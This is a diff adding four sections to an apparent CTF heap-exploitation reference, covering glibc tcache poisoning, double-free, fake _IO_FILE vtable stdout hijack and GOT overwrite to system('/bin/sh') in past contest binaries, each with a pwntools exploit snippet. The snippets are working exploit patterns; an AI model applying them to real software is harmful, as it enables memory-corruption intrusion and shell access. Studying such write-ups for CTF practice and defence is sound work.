@@ -19,6 +19,10 @@
 - [UAF Vtable Pointer Encoding Shell Argument (BCTF 2017)](#uaf-vtable-pointer-encoding-shell-argument-bctf-2017)
 - [Uninitialized Chunk Residue Pointer Leak (picoCTF 2018)](#uninitialized-chunk-residue-pointer-leak-picoctf-2018)
 - [tcache strcpy Null-Byte Overflow + Backward Consolidation (HITCON 2018)](#tcache-strcpy-null-byte-overflow--backward-consolidation-hitcon-2018)
+- [Adjacent-Struct fn-Pointer Overflow for Libc Leak + GOT Overwrite (RITSEC 2018)](#adjacent-struct-fn-pointer-overflow-for-libc-leak--got-overwrite-ritsec-2018)
+- [Hidden Menu Option 1337 for Tcache Poisoning (FireShell 2019)](#hidden-menu-option-1337-for-tcache-poisoning-fireshell-2019)
+- [Tcache Double-Free + Fake _IO_FILE Vtable Stdout Hijack (BCTF 2018)](#tcache-double-free--fake-_io_file-vtable-stdout-hijack-bctf-2018)
+- [Tcache-to-Fastbin Promotion Cross-Bin Attack (BCTF 2018)](#tcache-to-fastbin-promotion-cross-bin-attack-bctf-2018)
 
 For FILE-structure (_IO_FILE) exploitation — fastbin stdout vtable hijack, _IO_buf_base null-byte overwrite, glibc 2.24+ vtable validation bypass, unsorted-bin attacks on stdin FILE fields, realloc-as-free UAF, and refcount wraparound — see [heap-fsop.md](heap-fsop.md).
 
@@ -636,3 +640,92 @@ log.success(f"libc base {libc.address:#x}")
 **Key insight:** tcache bypasses most pre-2.27 consolidation tricks, but the `strcpy` null-byte overflow remains viable because it acts on the *next chunk's header*, not the current chunk's in-use flag. Combined with careful zeroing of glibc 2.26+ memset residue (the `0xda` pattern glibc uses on free), you can re-use classic off-by-one-null techniques even in a tcache world. The magic sizes are: large enough to skip the tcache (>0x408 for the freed chunk), small enough to land next to the overflow target.
 
 **References:** HITCON CTF 2018 — Children Tcache, writeup 11929
+
+---
+
+## Adjacent-Struct fn-Pointer Overflow for Libc Leak + GOT Overwrite (RITSEC 2018)
+
+**Pattern:** Go binary compiled with `cgo` places a name buffer immediately adjacent to a struct whose first field is a function pointer (C-style vtable). Overflowing the name field corrupts the next struct's function pointer. First overwrite → redirect the call to `puts(got['free'])` to leak libc. Second overwrite → point free's GOT entry at `system`, then free a chunk whose contents are `"/bin/sh"`.
+
+```python
+# 1. Leak libc
+payload = b'A'*name_size + p64(puts_plt) + p64(pop_rdi_ret) + p64(free_got)
+io.send(payload); io.recvuntil(b'name: '); libc = u64(io.recv(6).ljust(8, b'\x00'))
+
+# 2. Overwrite free@GOT with system
+libc_base = libc - libc_syms['puts']
+io.send(b'A'*name_size + p64(libc_base + libc_syms['system']))
+
+# 3. Free a chunk whose contents are "/bin/sh\x00"
+io.sendline('/bin/sh')
+io.sendline('delete 0')
+```
+
+**Key insight:** cgo binaries often have C-style structs next to Go-allocated buffers, so classic C-heap techniques still work against Go servers. Look for `GoString` + `char*` + function pointer patterns in the decompile; the layout is usually deterministic.
+
+**References:** RITSEC CTF 2018 — Yet Another HR Management Framework, writeups 12283, 12287
+
+---
+
+## Hidden Menu Option 1337 for Tcache Poisoning (FireShell 2019)
+
+**Pattern:** The visible menu caps allocations at a few chunks, but disassembly reveals an undocumented option (`1337`) that calls `malloc` and `edit` without updating the counter — effectively giving you unlimited allocations. Combined with a vanilla tcache UAF, this lets you flood the tcache, overwrite an entry's `fd` with a BSS target, and `malloc` arbitrary addresses.
+
+```python
+def hidden(sz, data):
+    p.sendlineafter(b'>', b'1337')
+    p.sendlineafter(b'size:', str(sz).encode())
+    p.sendafter(b'data:', data)
+
+free(0); free(1)
+hidden(0x20, p64(bss_target))   # tcache fd → bss_target
+_ = malloc(0x20)                # first chunk back
+shell = malloc(0x20)            # returns bss_target
+```
+
+**Key insight:** Always dump the menu parser for undocumented branches before assuming a challenge is "rate-limited". Numeric options like `1337`, `9999`, `0xdead` are classic bypasses that the author ships to debug the challenge.
+
+**References:** FireShell CTF 2019 — babyheap, writeup 12962
+
+---
+
+## Tcache Double-Free + Fake _IO_FILE Vtable Stdout Hijack (BCTF 2018)
+
+**Pattern:** Small allocation budget, fastbin + tcache available. Double-free a fastbin chunk into the tcache, malloc to obtain a tcache entry that points at `_IO_2_1_stdout_`, then overwrite stdout's `vtable` pointer to a fake jump table where `_IO_file_overflow` → `system`. Next printf call executes `system("/bin/sh")`.
+
+```python
+# 1. Free A twice (bypasses fastbin double-free via tcache)
+free(A); free(A)
+# 2. Malloc returns A; write stdout addr as next fd
+edit(A, p64(stdout))
+# 3. Next malloc returns stdout
+malloc()
+malloc()  # returns &stdout
+edit(stdout, fake_file_struct(vtable=fake_vt))
+```
+
+Fake vtable entry: slot for `_IO_file_overflow = system`.
+
+**Key insight:** tcache skips fastbin safety checks, so a double-free directly into the tcache works without the usual size-field trickery. The resulting write-where primitive reaches `_IO_2_1_stdout_` in libc trivially.
+
+**References:** BCTF 2018 — easiest, writeup 12489
+
+---
+
+## Tcache-to-Fastbin Promotion Cross-Bin Attack (BCTF 2018)
+
+**Pattern:** Only ~2 allocations available — too few for a traditional tcache dup. Instead, fill tcache, overflow into fastbin, craft chunk whose header points inside a known structure. When fastbin allocation promotes back into tcache (after a future free), malloc returns the header address.
+
+```python
+for _ in range(7): free(tcache_chunks[_])   # fill tcache bin
+free(fastbin_chunk)                         # goes to fastbin
+edit(fastbin_chunk, p64(target_hdr))        # poison fastbin fd
+# Drain tcache so next free of fastbin_chunk promotes:
+for _ in range(7): malloc(size)
+free(fastbin_chunk)                         # now lands in tcache
+malloc(size)                                 # returns tcache head = target_hdr
+```
+
+**Key insight:** tcache and fastbin share size classes at certain boundaries; a chunk that starts in one often migrates to the other. Use that promotion as an additional reallocation step when budget is tight.
+
+**References:** BCTF 2018 — three/houseofatum, writeups 12476, 12477
